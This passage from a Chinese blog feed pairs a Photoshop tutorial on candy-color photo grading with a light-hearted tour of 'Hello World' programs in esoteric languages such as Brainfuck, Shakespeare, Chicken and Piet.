 最近在微博上刷到许多大佬拍的 fine view，学生党暂时没钱买相机，于是就先在这里记录下学习如何后期处理吧。</p>
<h2 id="澳大利亚摄影师-ben-thomas的摄影作品"><a class="anchor" href="#澳大利亚摄影师-ben-thomas的摄影作品">#</a> 澳大利亚摄影师 Ben Thomas 的摄影作品</h2>
<p><img data-src="https://i.loli.net/2021/02/20/NF1UvKaRSizG92m.jpg" alt="" title="通过后期调色，将照片的颜色调整为梦幻的糖果色;" /></p>
<h2 id="这张是我动手调整的别人的摄影作品"><a class="anchor" href="#这张是我动手调整的别人的摄影作品">#</a> 这张是我动手调整的别人的摄影作品</h2>
<p><img data-src="https://i.loli.net/2021/02/20/IRiyoOATrLCleVw.png" alt="" title="啊哈哈...可能雾霾感重了点喔" /></p>
<h3 id="how_done_it"><a class="anchor" href="#how_done_it">#</a> How_Done_It</h3>
<p>并不是所有的图片都适合糖果风，如果整个图中有很深的阴影 (阴影太多也很麻烦)，制作成糖果色要麻烦很多。于是我们可以选择拍一些晴天少云，颜色偏青并且建筑偏黄偏粉 (比如迪士尼)，画面中尽可能有比较规整的大面积色块。</p>
<p>这里我们使用 Adobe Photoshop 打开图片<br />
<img data-src="https://i.loli.net/2021/02/20/XfMUBSkZgP5wVN4.jpg" alt="" /></p>
<p>因为图片本身暗部就比较少了，所以这里就不需要调亮了。<br />
首先打开色阶，这里将黑场向右拖动让黑场变亮<br />
<img data-src="https://i.loli.net/2021/02/20/OT712wVP3nlFYqs.png" alt="" /><br />
其实就是让暗部在变亮一点；</p>
<p>其次我们将灰场往左拖动，让图片整体变亮。<br />
<img data-src="https://i.loli.net/2021/02/20/Brnb1gsi5dl7yup.png" alt="" /></p>
<p>接下来调整色块的颜色。<br />
这里我是用的色相饱和度调整；饱和度往往用于调整颜色的鲜艳程度，往右可以增加饱和度，往左可以降低饱和度。明度可以用于调整亮度。<br />
需要对某一颜色进行调整时可以选择一种颜色进行参数变量；<br />
先将天空的颜色调到偏青：<br />
<img data-src="https://i.loli.net/2021/02/20/9TZXtnJjOBuaI6F.png" alt="" /><br />
往左调整，将蓝色调到偏青色。</p>
<p>先来看看效果如何<br />
<img data-src="https://i.loli.net/2021/02/20/JgwrS92l84KIRvV.png" alt="" /></p>
<p>之后，调整便利店的颜色，适当调亮就好啦。<br />
<img data-src="https://i.loli.net/2021/02/20/PuKgrkS9TH8Z71Y.png" alt="" /><br />
红色色块和黄色类似，这里忘记上了<br />
<img data-src="https://i.loli.net/2021/02/20/TSFpKjG9w6uf7Dh.png" alt="" title="差不多就是这样啦" /></p>
<p>调色过程中可能会碰到部分区块变色，可以使用蒙版将无需变色的部分稍微涂抹一下。就目前颜色差不多达到预期的效果了，接下来可以调整对比度。<br />
<img data-src="https://i.loli.net/2021/02/20/i7alYSsoqK4eJyD.png" alt="" /><br />
将亮区往下拖一点，暗区适当增亮；<br />
如果想要一些其他效果增强图片观感的话最后可以加一下锐化调整分辨率等其他操作，这里就不细说了；</p>
<p>最后，糖果色的调整就完成啦<br />
<img data-src="https://ae01.alicdn.com/kf/Ub3ebcfb84a1f48469547c6d577f0a4a6d.jpg" alt="" /></p>
<p>调整糖果色并不困难，针对不同图像有不同的调法；</p>
<p>参考：知乎</p>
]]></content>
      <categories>
        <category>摄影</category>
      </categories>
      <tags>
        <tag>PS--色调</tag>
      </tags>
  </entry>
  <entry>
    <title>别再错误地输出&quot;Hello World!&quot;啦</title>
    <url>/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E8%BE%93%E5%87%BAHelloWorld/</url>
    <content><![CDATA[<p>优雅，永不过时<br />
 — — 卡达・烬</p>
<p><a id="more"></a></p>
<h1 id="前言"><a class="anchor" href="#前言">#</a> 前言</h1>
<p>​	曾经，有一类编程语言被单独归为一类，Esoteric programming languages</p>
<p>​	曾经，有一类编程语言直到两年后才有自己的 &quot;Hello World!&quot;</p>
<p>​	如果运气够好，或许一辈子也不会接触到这种奇葩语言。</p>
<p>​	你说最近倒霉，没关系，我这不来分享🐂🍺代码了嘛。</p>
<h1 id="hello-world我不干净了"><a class="anchor" href="#hello-world我不干净了">#</a> Hello World：我不干净了</h1>
<h2 id="intercal"><a class="anchor" href="#intercal">#</a> INTERCAL</h2>
<p>​	如果代码中不经常使用 “PLEASE” ，编译代码就会报错，它认为这个项目不够礼貌；</p>
<p>&lt;img src = '<span class="exturl" data-url="aHR0cHM6Ly9zMy5ibXAub3ZoL2ltZ3MvMjAyMi8wOC8yMC9kMjRmYmIzZWFiMzdkOGVjLndlYnA=">https://s3.bmp.ovh/imgs/2022/08/20/d24fbb3eab37d8ec.webp</span>' &gt;</p>
<p>​</p>
<p>​	如果修饰语 “PLEASE” 过多，编译器也会报错，他认为你 “过分礼貌”。</p>
<h2 id="brainfuck"><a class="anchor" href="#brainfuck">#</a> <strong>Brainfuck</strong></h2>
<p>​	这个最有名啦，经常会在一些编码里面碰到他</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>++++++++++[>+++++++>++++++++++>+++>+&lt;&lt;&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>-]</span><span class="token punctuation">></span></span>++.>+.+++++++..+++.>++.&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+++++++++++++++.</span><span class="token punctuation">></span></span>.+++.------.--------.>+.>.</pre></td></tr></table></figure><p>​	我更喜欢叫他 &quot;脑干&quot;，整个语言只包含 8 个不同的字符，用于实现任何代码，由 Muller 开发的原始编译器只使用了 296 个字节。其主要设计理念就是用最小的概念实现一种 “简单” 的语言。</p>
<h2 id="dna"><a class="anchor" href="#dna">#</a> <strong>DNA</strong></h2>
<p>众所周知， 脱氧核糖核酸构成基因的双链<em> DNA</em> 分子用一条单链作为模板，转录产生与其序列互补的信使 RNA 分子，然后在反转录酶的作用下，以 mRNA 分子为模板，合成一条与 mRNA 序列互补的单链<em> DNA</em></p>
<p>最后 Hello world!</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>AT</pre></td></tr><tr><td data-num="2"></td><td><pre>  T--A</pre></td></tr><tr><td data-num="3"></td><td><pre> A----T</pre></td></tr><tr><td data-num="4"></td><td><pre> T-----A</pre></td></tr><tr><td data-num="5"></td><td><pre> T-----A</pre></td></tr><tr><td data-num="6"></td><td><pre> G----C</pre></td></tr><tr><td data-num="7"></td><td><pre>  T--A</pre></td></tr><tr><td data-num="8"></td><td><pre>   GC</pre></td></tr><tr><td data-num="9"></td><td><pre>   CG</pre></td></tr><tr><td data-num="10"></td><td><pre>  C--G</pre></td></tr><tr><td data-num="11"></td><td><pre> A----T</pre></td></tr><tr><td data-num="12"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="13"></td><td><pre> T-----A</pre></td></tr><tr><td data-num="14"></td><td><pre> A----T</pre></td></tr><tr><td data-num="15"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="16"></td><td><pre>   GC</pre></td></tr><tr><td data-num="17"></td><td><pre>   AT</pre></td></tr><tr><td data-num="18"></td><td><pre>  C--G</pre></td></tr><tr><td data-num="19"></td><td><pre> T----A</pre></td></tr><tr><td data-num="20"></td><td><pre> C-----G</pre></td></tr><tr><td data-num="21"></td><td><pre> T-----A</pre></td></tr><tr><td data-num="22"></td><td><pre> G----C</pre></td></tr><tr><td data-num="23"></td><td><pre>  C--G</pre></td></tr><tr><td data-num="24"></td><td><pre>   CG</pre></td></tr><tr><td data-num="25"></td><td><pre>   AT</pre></td></tr><tr><td data-num="26"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="27"></td><td><pre> T----A</pre></td></tr><tr><td data-num="28"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="29"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="30"></td><td><pre> G----C</pre></td></tr><tr><td data-num="31"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="32"></td><td><pre>   GC</pre></td></tr><tr><td data-num="33"></td><td><pre>   TA</pre></td></tr><tr><td data-num="34"></td><td><pre>  G--C</pre></td></tr><tr><td data-num="35"></td><td><pre> T----A</pre></td></tr><tr><td data-num="36"></td><td><pre> G-----C</pre></td></tr><tr><td data-num="37"></td><td><pre> C-----G</pre></td></tr><tr><td data-num="38"></td><td><pre> C----G</pre></td></tr><tr><td data-num="39"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="40"></td><td><pre>   GC</pre></td></tr><tr><td data-num="41"></td><td><pre>   TA</pre></td></tr><tr><td data-num="42"></td><td><pre>  G--C</pre></td></tr><tr><td data-num="43"></td><td><pre> A----T</pre></td></tr><tr><td data-num="44"></td><td><pre> G-----C</pre></td></tr><tr><td data-num="45"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="46"></td><td><pre> C----G</pre></td></tr><tr><td data-num="47"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="48"></td><td><pre>   CG</pre></td></tr><tr><td data-num="49"></td><td><pre>   GC</pre></td></tr><tr><td data-num="50"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="51"></td><td><pre> A----T</pre></td></tr><tr><td data-num="52"></td><td><pre> C-----G</pre></td></tr><tr><td data-num="53"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="54"></td><td><pre> C----G</pre></td></tr><tr><td data-num="55"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="56"></td><td><pre>   CG</pre></td></tr><tr><td data-num="57"></td><td><pre>   GC</pre></td></tr><tr><td data-num="58"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="59"></td><td><pre> T----A</pre></td></tr><tr><td data-num="60"></td><td><pre> G-----C</pre></td></tr><tr><td data-num="61"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="62"></td><td><pre> G----C</pre></td></tr><tr><td data-num="63"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="64"></td><td><pre>   CG</pre></td></tr><tr><td data-num="65"></td><td><pre>   GC</pre></td></tr><tr><td data-num="66"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="67"></td><td><pre> G----C</pre></td></tr><tr><td data-num="68"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="69"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="70"></td><td><pre> T----A</pre></td></tr><tr><td data-num="71"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="72"></td><td><pre>   TA</pre></td></tr><tr><td data-num="73"></td><td><pre>   AT</pre></td></tr><tr><td data-num="74"></td><td><pre>  T--A</pre></td></tr><tr><td data-num="75"></td><td><pre> G----C</pre></td></tr><tr><td data-num="76"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="77"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="78"></td><td><pre> A----T</pre></td></tr><tr><td data-num="79"></td><td><pre>  G--C</pre></td></tr><tr><td data-num="80"></td><td><pre>   AT</pre></td></tr><tr><td data-num="81"></td><td><pre>   AT</pre></td></tr><tr><td data-num="82"></td><td><pre>  G--C</pre></td></tr><tr><td data-num="83"></td><td><pre> T----A</pre></td></tr><tr><td data-num="84"></td><td><pre> G-----C</pre></td></tr><tr><td data-num="85"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="86"></td><td><pre> G----C</pre></td></tr><tr><td data-num="87"></td><td><pre>  G--C</pre></td></tr><tr><td data-num="88"></td><td><pre>   AT</pre></td></tr><tr><td data-num="89"></td><td><pre>   TA</pre></td></tr><tr><td data-num="90"></td><td><pre>  T--A</pre></td></tr><tr><td data-num="91"></td><td><pre> A----T</pre></td></tr><tr><td data-num="92"></td><td><pre> G-----C</pre></td></tr><tr><td data-num="93"></td><td><pre> G-----C</pre></td></tr><tr><td data-num="94"></td><td><pre> A----T</pre></td></tr><tr><td data-num="95"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="96"></td><td><pre>   TA</pre></td></tr><tr><td data-num="97"></td><td><pre>   AT</pre></td></tr><tr><td data-num="98"></td><td><pre>  T--A</pre></td></tr><tr><td data-num="99"></td><td><pre> A----T</pre></td></tr><tr><td data-num="100"></td><td><pre> T-----A</pre></td></tr><tr><td data-num="101"></td><td><pre> G-----C</pre></td></tr><tr><td data-num="102"></td><td><pre> A----T</pre></td></tr><tr><td data-num="103"></td><td><pre>  T--A</pre></td></tr><tr><td data-num="104"></td><td><pre>   TA</pre></td></tr><tr><td data-num="105"></td><td><pre>   AT</pre></td></tr><tr><td data-num="106"></td><td><pre>  G--C</pre></td></tr><tr><td data-num="107"></td><td><pre> A----T</pre></td></tr><tr><td data-num="108"></td><td><pre> T-----A</pre></td></tr><tr><td data-num="109"></td><td><pre> A-----T</pre></td></tr><tr><td data-num="110"></td><td><pre> T----A</pre></td></tr><tr><td data-num="111"></td><td><pre>  G--C</pre></td></tr><tr><td data-num="112"></td><td><pre>   AT</pre></td></tr><tr><td data-num="113"></td><td><pre>   TA</pre></td></tr><tr><td data-num="114"></td><td><pre>  T--A</pre></td></tr><tr><td data-num="115"></td><td><pre> A----T</pre></td></tr><tr><td data-num="116"></td><td><pre> G-----C</pre></td></tr><tr><td data-num="117"></td><td><pre> G-----C</pre></td></tr><tr><td data-num="118"></td><td><pre> A----T</pre></td></tr><tr><td data-num="119"></td><td><pre>  A--T</pre></td></tr><tr><td data-num="120"></td><td><pre>   AT</pre></td></tr><tr><td data-num="121"></td><td><pre>   AT</pre></td></tr><tr><td data-num="122"></td><td><pre>  T--A</pre></td></tr><tr><td data-num="123"></td><td><pre> G----C</pre></td></tr><tr><td data-num="124"></td><td><pre> A-----T</pre></td></tr></table></figure><h2 id="fugue"><a class="anchor" href="#fugue">#</a> <strong>Fugue</strong></h2>
<p>&lt;img src = '<span class="exturl" data-url="aHR0cHM6Ly9zMy5ibXAub3ZoL2ltZ3MvMjAyMi8wOC8yMC9hYmJmMzMzOGMyOTc2NGU2LnBuZw==">https://s3.bmp.ovh/imgs/2022/08/20/abbf3338c29764e6.png</span>' &gt;</p>
<h2 id="sacred"><a class="anchor" href="#sacred">#</a> <strong>Sacred</strong></h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>() () () () () () () () () () ( )) () () () () () () () )) () () () () () () () () () () )) () () () )) () (( (( (( (( )( ) )) () () ((( )) () ((( () () () () () () () ((( ((( () () () ((( )) () () ((( (( (( () () () () () () () () () () () () () () () ((( )) ((( () () () ((( )( )( )( )( )( )( ((( )( )( )( )( )( )( )( )( ((( )) () ((( )) (((</pre></td></tr></table></figure><h2 id="shakespeare"><a class="anchor" href="#shakespeare">#</a> <strong>Shakespeare</strong></h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>The Infamous Hello World Program.</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>Romeo, a young man with a remarkable patience.</pre></td></tr><tr><td data-num="4"></td><td><pre>Juliet, a likewise young woman of remarkable grace.</pre></td></tr><tr><td data-num="5"></td><td><pre>Ophelia, a remarkable woman much in dispute with Hamlet.</pre></td></tr><tr><td data-num="6"></td><td><pre>Hamlet, the flatterer of Andersen Insulting A/S.</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>                    Act I: Hamlet's insults and flattery.</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>                    Scene I: The insulting of Romeo.</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>[Enter Hamlet and Romeo]</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>Hamlet:</pre></td></tr><tr><td data-num="16"></td><td><pre> You lying stupid fatherless big smelly half-witted coward!</pre></td></tr><tr><td data-num="17"></td><td><pre> You are as stupid as the difference between a handsome rich brave</pre></td></tr><tr><td data-num="18"></td><td><pre> hero and thyself! Speak your mind!</pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre> You are as brave as the sum of your fat little stuffed misused dusty</pre></td></tr><tr><td data-num="21"></td><td><pre> old rotten codpiece and a beautiful fair warm peaceful sunny summer's</pre></td></tr><tr><td data-num="22"></td><td><pre> day. You are as healthy as the difference between the sum of the</pre></td></tr><tr><td data-num="23"></td><td><pre> sweetest reddest rose and my father and yourself! Speak your mind!</pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre> You are as cowardly as the sum of yourself and the difference</pre></td></tr><tr><td data-num="26"></td><td><pre> between a big mighty proud kingdom and a horse. Speak your mind.</pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre> Speak your mind!</pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>[Exit Romeo]</pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>                    Scene II: The praising of Juliet.</pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>[Enter Juliet]</pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>Hamlet:</pre></td></tr><tr><td data-num="37"></td><td><pre> Thou art as sweet as the sum of the sum of Romeo and his horse and his</pre></td></tr><tr><td data-num="38"></td><td><pre> black cat! Speak thy mind!</pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre>[Exit Juliet]</pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre>                    Scene III: The praising of Ophelia.</pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre>[Enter Ophelia]</pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>Hamlet:</pre></td></tr><tr><td data-num="47"></td><td><pre> Thou art as lovely as the product of a large rural town and my amazing</pre></td></tr><tr><td data-num="48"></td><td><pre> bottomless embroidered purse. Speak thy mind!</pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre> Thou art as loving as the product of the bluest clearest sweetest sky</pre></td></tr><tr><td data-num="51"></td><td><pre> and the sum of a squirrel and a white horse. Thou art as beautiful as</pre></td></tr><tr><td data-num="52"></td><td><pre> the difference between Juliet and thyself. Speak thy mind!</pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre>[Exeunt Ophelia and Hamlet]</pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre>                    Act II: Behind Hamlet's back.</pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre>                    Scene I: Romeo and Juliet's conversation.</pre></td></tr><tr><td data-num="60"></td><td><pre></pre></td></tr><tr><td data-num="61"></td><td><pre>[Enter Romeo and Juliet]</pre></td></tr><tr><td data-num="62"></td><td><pre></pre></td></tr><tr><td data-num="63"></td><td><pre>Romeo:</pre></td></tr><tr><td data-num="64"></td><td><pre> Speak your mind. You are as worried as the sum of yourself and the</pre></td></tr><tr><td data-num="65"></td><td><pre> difference between my small smooth hamster and my nose. Speak your</pre></td></tr><tr><td data-num="66"></td><td><pre> mind!</pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre>Juliet:</pre></td></tr><tr><td data-num="69"></td><td><pre> Speak YOUR mind! You are as bad as Hamlet! You are as small as the</pre></td></tr><tr><td data-num="70"></td><td><pre> difference between the square of the difference between my little pony</pre></td></tr><tr><td data-num="71"></td><td><pre> and your big hairy hound and the cube of your sorry little</pre></td></tr><tr><td data-num="72"></td><td><pre> codpiece. Speak your mind!</pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre>[Exit Romeo]</pre></td></tr><tr><td data-num="75"></td><td><pre></pre></td></tr><tr><td data-num="76"></td><td><pre>                    Scene II: Juliet and Ophelia's conversation.</pre></td></tr><tr><td data-num="77"></td><td><pre></pre></td></tr><tr><td data-num="78"></td><td><pre>[Enter Ophelia]</pre></td></tr><tr><td data-num="79"></td><td><pre></pre></td></tr><tr><td data-num="80"></td><td><pre>Juliet:</pre></td></tr><tr><td data-num="81"></td><td><pre> Thou art as good as the quotient between Romeo and the sum of a small</pre></td></tr><tr><td data-num="82"></td><td><pre> furry animal and a leech. Speak your mind!</pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>Ophelia:</pre></td></tr><tr><td data-num="85"></td><td><pre> Thou art as disgusting as the quotient between Romeo and twice the</pre></td></tr><tr><td data-num="86"></td><td><pre> difference between a mistletoe and an oozing infected blister! Speak</pre></td></tr><tr><td data-num="87"></td><td><pre> your mind!</pre></td></tr><tr><td data-num="88"></td><td><pre></pre></td></tr><tr><td data-num="89"></td><td><pre>[Exeunt]</pre></td></tr></table></figure><p>​	居然还能用诗歌编，我是没想到的</p>
<h2 id="chicken"><a class="anchor" href="#chicken">#</a> Chicken</h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="2"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="3"></td><td><pre>chicken chicken chicken chicken</pre></td></tr><tr><td data-num="4"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="5"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="6"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="7"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="8"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="9"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="10"></td><td><pre>chicken chicken chicken chicken</pre></td></tr><tr><td data-num="11"></td><td><pre>chicken chicken chicken</pre></td></tr><tr><td data-num="12"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="13"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="14"></td><td><pre>chicken chicken chicken</pre></td></tr><tr><td data-num="15"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="16"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="17"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="18"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="19"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="20"></td><td><pre>chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>chicken chicken chicken</pre></td></tr><tr><td data-num="23"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="24"></td><td><pre>chicken chicken chicken chicken</pre></td></tr><tr><td data-num="25"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="26"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="27"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="28"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="29"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="30"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="31"></td><td><pre>chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>chicken chicken chicken chicken</pre></td></tr><tr><td data-num="34"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="35"></td><td><pre>chicken chicken</pre></td></tr><tr><td data-num="36"></td><td><pre>chicken chicken</pre></td></tr><tr><td data-num="37"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="38"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="39"></td><td><pre>chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>chicken chicken</pre></td></tr><tr><td data-num="42"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="43"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="44"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="45"></td><td><pre>chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="48"></td><td><pre>chicken chicken chicken</pre></td></tr><tr><td data-num="49"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="50"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="51"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="52"></td><td><pre>chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="55"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="56"></td><td><pre>chicken chicken chicken</pre></td></tr><tr><td data-num="57"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="58"></td><td><pre>chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken</pre></td></tr><tr><td data-num="59"></td><td><pre>chicken chicken chicken chicken chicken chicken</pre></td></tr></table></figure><p>你干嘛</p>
<p>&lt;img src = '<span class="exturl" data-url="aHR0cHM6Ly9zMy5ibXAub3ZoL2ltZ3MvMjAyMi8wOC8yMC9mMWQ4NjJiMDUxZGVjZGEzLmpwZw==">https://s3.bmp.ovh/imgs/2022/08/20/f1d862b051decda3.jpg</span>' &gt;</p>
<h2 id="brainloller"><a class="anchor" href="#brainloller">#</a> <strong>Brainloller</strong></h2>
<p>&lt;img src = '<span class="exturl" data-url="aHR0cHM6Ly9zMy5ibXAub3ZoL2ltZ3MvMjAyMi8wOC8yMC8wYTg4NWQ2OTAyM2VkYTZlLnBuZw==">https://s3.bmp.ovh/imgs/2022/08/20/0a885d69023eda6e.png</span>' &gt;</p>
<p>一般都是用 bftools.exe 隐写工具，具体命令是 bftools.exe decode brainloller 1.png --output 1.txt</p>
<h2 id="piet"><a class="anchor" href="#piet">#</a> Piet</h2>
<p>&lt;img src = '<span class="exturl" data-url="aHR0cHM6Ly9zMy5ibXAub3ZoL2ltZ3MvMjAyMi8wOC8yMC8wMWMxNWEwYTBjNjBhOWRkLnBuZw==">https://s3.bmp.ovh/imgs/2022/08/20/01c15a0a0c60a9dd.png</span>' &gt;</p>
<p>&lt;img src = '<span class="exturl" data-url="aHR0cHM6Ly9zMy5ibXAub3ZoL2ltZ3MvMjAyMi8wOC8yMC85YWUzMjdlZjUwZWIwNDBlLnBuZw==">https://s3.bmp.ovh/imgs/2022/08/20/9ae327ef50eb040e.png</span>' &gt;</p>
